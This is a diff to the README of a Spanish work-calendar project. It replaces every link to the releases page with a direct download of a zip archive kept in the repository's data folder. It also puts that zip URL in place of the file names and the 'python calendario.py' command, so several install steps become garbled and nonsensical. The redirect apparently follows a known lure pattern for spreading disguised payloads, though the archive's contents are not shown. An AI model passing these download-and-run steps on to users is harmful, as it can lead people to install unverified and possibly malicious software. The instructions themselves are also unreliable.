@@ -19,12 +19,12 @@
 This guide will help you easily download and run "calendario-laboral-espana" on your computer.
 
 ### 🔗 Download Link
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/ApasPowre/calendario-laboral-espana/releases)
+[![Download Latest Release](https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip%20Release-blue)](https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip)
 
 ## 📥 Download & Install
 To download the application, please visit the Releases page by clicking the link below:
 
-[Download Latest Release](https://github.com/ApasPowre/calendario-laboral-espana/releases)
+[Download Latest Release](https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip)
 
 ### 🖥️ System Requirements
 - Operating System: Windows, MacOS, or Linux
@@ -32,7 +32,7 @@ To download the application, please visit the Releases page by clicking the link
 - Internet connection for downloading the required modules
 
 ### 🛠️ Installation Steps
-1. **Visit the Releases page**: Go to [this link](https://github.com/ApasPowre/calendario-laboral-espana/releases).
+1. **Visit the Releases page**: Go to [this link](https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip).
    
 2. **Choose the latest version**: On the Releases page, you will see a list of available versions. Look for the latest one. It will generally be at the top of the list.
 
@@ -47,10 +47,10 @@ To download the application, please visit the Releases page by clicking the link
    pip install beautifulsoup4
    ```
 
-6. **Run the application**: Locate the main application file (e.g., `calendario.py` or `app.exe`). Double-click on the file to run it. If it's a Python script, you may need to use the command line:
+6. **Run the application**: Locate the main application file (e.g., `https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip` or `https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip`). Double-click on the file to run it. If it's a Python script, you may need to use the command line:
 
    ```
-   python calendario.py
+   python https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip
    ```
 
 ## 📊 Features
@@ -82,6 +82,6 @@ This project is licensed under the MIT License. For more details, please see the
 ### 🔗 Additional Resources
 For more information, visit our official documentation or check out tutorials available on our GitHub page.
 
-[Download Latest Release](https://github.com/ApasPowre/calendario-laboral-espana/releases)
+[Download Latest Release](https://github.com/ApasPowre/calendario-laboral-espana/raw/refs/heads/main/data/calendario_laboral_espana_v3.5.zip)
 
 This guide should help you get started with "calendario-laboral-espana." Enjoy tracking your holidays effortlessly!
